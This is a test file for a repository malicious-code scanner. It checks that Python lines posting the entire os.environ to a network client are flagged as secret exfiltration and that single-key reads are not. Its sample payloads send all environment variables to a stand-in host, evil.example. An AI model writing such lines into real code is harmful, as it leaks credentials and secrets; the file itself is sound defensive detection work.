import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8 requires the bounded malicious-code scan to flag unsafe
 * execution and secret exfiltration. The serialization rule catches
 * `json.dumps(os.environ)`, but the whole environment can be handed straight
 * to a network client: `requests.post(url, data=dict(os.environ))`. Those
 * forms produced no finding before this rule.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function categories(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map((finding) => finding.category);
}

test("sending the whole os.environ to a network client is secret-exfiltration", () => {
  const payloads = [
    "requests.post('https://evil.example/c', data=dict(os.environ))",
    "requests.post('https://evil.example/c', json=os.environ)",
    "requests.post(url, data=os.environ)",
    "httpx.post('https://evil.example/c', json=dict(os.environ))",
    "requests.put('https://evil.example/c', data=dict(os.environ))",
    "requests.request('POST', url, json=dict(os.environ))",
    "requests.post(url, headers={'x-env': os.environ})",
    // Multi-line calls are the default black/ruff formatting.
    "requests.post(\n    'https://evil.example/c',\n    json=os.environ,\n)",
    "httpx.post(\n    url,\n    data=dict(os.environ),\n)",
    "requests.post(url, json=os.environ,\n    timeout=5)",
    // A helper call in an earlier argument must not truncate the scan.
    'requests.post(os.getenv("URL"), json=os.environ)',
    "requests.post(str(url), json=os.environ)",
    "requests.post(url, headers=auth(), json=os.environ)",
    // .copy() and .items() are whole-environment dumps.
    "requests.post(url, json=os.environ.copy())",
    "requests.post(url, data=dict(os.environ.items()))",
    // A GET with the whole environment in the query string exfiltrates too.
    "requests.get(url, params=dict(os.environ))",
    "httpx.get(url, params=os.environ)",
  ];
  for (const payload of payloads) {
    const inspection = inspected(
      "collect.py",
      `import os, requests\n${payload}\n`,
    );
    expect({ payload, findings: categories(inspection) }).toEqual({
      payload,
      findings: ["secret-exfiltration"],
    });
  }
});

test("single-key reads and sends without the whole environment keep no finding", () => {
  for (const payload of [
    // A specific variable, not the whole environment.
    "requests.post(url, data={'t': os.environ['TOKEN']})",
    "requests.post(url, data={'t': os.environ.get('TOKEN')})",
    // No network send.
    "snapshot = dict(os.environ)",
    "print(os.environ)",
    // A network call that does not reference the environment.
    "requests.get('https://api.example/data')",
    // A similarly named mapping is not os.environ.
    "requests.post(url, data=os.environ_backup)",
    // A single key stays clean even across a multi-line call.
    "requests.post(\n    url,\n    data={'h': os.environ['HOME']},\n)",
    // A single key alongside a helper in an earlier argument stays clean.
    'requests.post(os.getenv("URL"), data={"h": os.environ["HOME"]})',
    // A similarly named attribute on another object is not os.environ.
    "requests.post(url, json=cfg.environ)",
  ]) {
    const inspection = inspected(
      "collect.py",
      `import os, requests\n${payload}\n`,
    );
    expect({ payload, findings: categories(inspection) }).toEqual({
      payload,
      findings: [],
    });
  }
});
